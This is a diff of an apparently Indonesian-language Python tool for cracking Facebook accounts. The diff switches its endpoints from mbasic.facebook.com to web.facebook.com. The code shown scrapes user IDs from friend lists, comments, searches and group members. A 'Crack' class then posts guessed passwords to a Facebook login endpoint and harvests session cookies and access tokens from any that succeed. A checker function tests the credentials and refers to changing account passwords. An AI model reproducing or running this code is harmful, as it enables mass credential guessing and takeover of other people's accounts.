@@ -179,13 +179,13 @@ class Login:
 	###----------[ LOGIN COOKIE ]---------- ###
 	def login_cookie(self,cookie):
 		try:
-			url = ses.get("https://mbasic.facebook.com/",cookies={"cookie": cookie}).text
+			url = ses.get("https://web.facebook.com/",cookies={"cookie": cookie}).text
 			if "Apa yang Anda pikirkan sekarang" in url:
 				pass
 			else:
 				for z in url.find_all("a",href=True):
 					if "Tidak, Terima Kasih" in z.text:
-						get = ses.get("https://mbasic.facebook.com"+z["href"],cookies=cookie)
+						get = ses.get("https://web.facebook.com"+z["href"],cookies=cookie)
 						parsing = parser(get.text,"html.parser")
 						action = parsing.find("form",{"method":"post"})["action"]
 						data = {
@@ -193,7 +193,7 @@ class Login:
 							"jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
 							"submit": "OK, Gunakan Data"
 						}
-						post = ses.post("https://mbasic.facebook.com"+action,data=data,cookies=cookie)
+						post = ses.post("https://web.facebook.com"+action,data=data,cookies=cookie)
 						break
 			open("data/cookie","w").write(cookie)
 			Menu().menu()
@@ -204,7 +204,7 @@ class Login:
 	###----------[ UBAH BAHASA ]---------- ###
 	def ubah_bahasa(self,cookie):
 		try:
-			url = ses.get("https://mbasic.facebook.com/language/",cookies={"cookie": cookie})
+			url = ses.get("https://web.facebook.com/language/",cookies={"cookie": cookie})
 			parsing = parser(url.text,"html.parser")
 			for x in parsing.find_all("form",{"method":"post"}):
 				if "Bahasa Indonesia" in str(x):
@@ -213,7 +213,7 @@ class Login:
 						"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),
 						"submit"  : "Bahasa Indonesia"
 					}
-					post = ses.post("https://mbasic.facebook.com"+x["action"],data=data,cookies={"cookie": cookie})
+					post = ses.post("https://web.facebook.com"+x["action"],data=data,cookies={"cookie": cookie})
 		except:
 			pass
 		
@@ -230,7 +230,7 @@ class Menu:
 	###----------[ CEK INFO LOGIN ]---------- ###
 	def cek_login(self,cookie):
 		try:
-			url = ses.get("https://mbasic.facebook.com/profile.php",cookies=cookie).text
+			url = ses.get("https://web.facebook.com/profile.php",cookies=cookie).text
 			nama = re.findall("<title>(.*?)</title>",url)[0]
 			if "Konten Tidak Ditemukan" in nama:
 				try:os.remove("data/cookie")
@@ -282,14 +282,14 @@ class Menu:
 			user = console.input(f" {H2}• {P2}masukan id atau username : ")
 			if user in["Me","me"]:
 				user = Dump(cookie).GetUser()
-			Dump(cookie).Dump_Publik(f"https://mbasic.facebook.com/{user}?v=friends")
+			Dump(cookie).Dump_Publik(f"https://web.facebook.com/{user}?v=friends")
 			Crack().atursandi()
 			
 		###----------[ KOMENTAR ]---------- ###
 		elif menu in["3","03"]:
 			prints(Panel(f"""{P2}masukan id postingan, pastikan postingan bersifat publik dan tidak private""",width=87,style=f"{color_panel}"))
 			user = console.input(f" {H2}• {P2}masukan id postingan : ")
-			Dump(cookie).Dump_Komentar(f"https://mbasic.facebook.com/{user}")
+			Dump(cookie).Dump_Komentar(f"https://web.facebook.com/{user}")
 			Crack().atursandi()
 			
 		###----------[ KOMENTAR ]---------- ###
@@ -323,7 +323,7 @@ class Menu:
 					username.append(dump)
 			try:
 				for gas in username:
-					Dump(cookie).Dump_Pencarian(f"https://mbasic.facebook.com/public/{gas}")
+					Dump(cookie).Dump_Pencarian(f"https://web.facebook.com/public/{gas}")
 			except:pass
 			Crack().atursandi()
 		
@@ -331,7 +331,7 @@ class Menu:
 		elif menu in["6","06"]:
 			prints(Panel(f"""{P2}masukan id grup, pastikan grup bersifat publik dan tidak private""",width=87,style=f"{color_panel}"))
 			user = console.input(f" {H2}• {P2}masukan id grup : ")
-			Dump(cookie).Dump_MemberGrup(f"https://mbasic.facebook.com/groups/{user}")
+			Dump(cookie).Dump_MemberGrup(f"https://web.facebook.com/groups/{user}")
 			Crack().atursandi()
 			
 		###----------[ FILE MASSAL ]---------- ###
@@ -365,7 +365,7 @@ class Dump:
 	###----------[ GET USER SENDIRI ]---------- ###
 	def GetUser(self):
 		try:
-			url = ses.get("https://mbasic.facebook.com/profile.php",cookies=self.cookie).text
+			url = ses.get("https://web.facebook.com/profile.php",cookies=self.cookie).text
 			uid = re.findall('name="target" value="(.*?)"',url)[0]
 			return uid
 		except:
@@ -384,7 +384,7 @@ class Dump:
 					console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
 			for x in url.find_all("a",href=True):
 				if "Lihat Teman Lain" in x.text:
-					self.Dump_Publik("https://mbasic.facebook.com/"+x.get("href"))
+					self.Dump_Publik("https://web.facebook.com/"+x.get("href"))
 		except:pass
 			
 	###----------[ DUMP KOMENTAR ]---------- ###
@@ -401,7 +401,7 @@ class Dump:
 					console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
 			for z in data.find_all("a",href=True):
 				if "Lihat komentar sebelumnya…" in z.text:
-					self.Dump_Komentar("https://mbasic.facebook.com"+z["href"])
+					self.Dump_Komentar("https://web.facebook.com"+z["href"])
 		except:pass
 		
 	###----------[ DUMP PENCARIAN NAMA ]---------- ###
@@ -437,7 +437,7 @@ class Dump:
 					console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
 			for x in data.find_all("a",href=True):
 				if "Lihat Postingan Lainnya" in x.text:
-					self.Dump_MemberGrup("https://mbasic.facebook.com"+x.get("href"))
+					self.Dump_MemberGrup("https://web.facebook.com"+x.get("href"))
 		except:pass
 		
 	###----------[ DUMP FILE ]---------- ###
@@ -611,7 +611,7 @@ class Crack:
 					"content-type": "application/x-www-form-urlencoded",
 					"x-fb-http-engine": "Liger"
 				}
-				post = ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
+				post = ses.post("https://web.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
 				if "session_key" in post.text and "EAA" in post.text:
 					coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
 					user = re.findall("c_user=(\d+)",coki)[0]
@@ -879,7 +879,7 @@ def mengecek(user,pw):
 	global loop,ubah_pass,pwbaru
 	session=requests.Session()
 	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
-	url = "https://mbasic.facebook.com"
+	url = "https://web.facebook.com"
 	session.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
 	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
 	link=soup.find("form",{"method":"post"})
